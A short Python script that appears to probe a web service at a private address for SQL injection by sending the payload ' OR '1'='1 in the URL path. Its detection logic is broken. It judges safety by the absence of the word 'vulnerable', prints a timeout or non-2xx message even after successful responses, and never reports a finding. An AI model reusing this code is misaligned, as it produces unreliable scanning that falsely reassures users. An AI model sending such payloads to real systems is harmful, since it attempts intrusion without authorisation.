import requests

def test_sqli(target_url, test_payload='\' OR \'1\'=\'1'):
    try:
        print(f'[*] Testing {target_url} for SQL Injection with payload: {test_payload}')
        response = requests.get(f'{target_url.rstrip("/")}/{test_payload}', timeout=5)
        if response.status_code in (200, 302) and 'vulnerable' not in response.text.lower():
            print('[+] No positive indicator found. Vulnerability seems to be non-exploitable.')
            return False
    except requests.exceptions.RequestException:
        pass
    print('[-] Request timed out or returned a non-2xx status code. Maybe it\'s not vulnerable.')
    return None

def main():
    target = 'http://192.168.2.69:3000'
    test_sqli(target)
if __name__ == '__main__':
    main()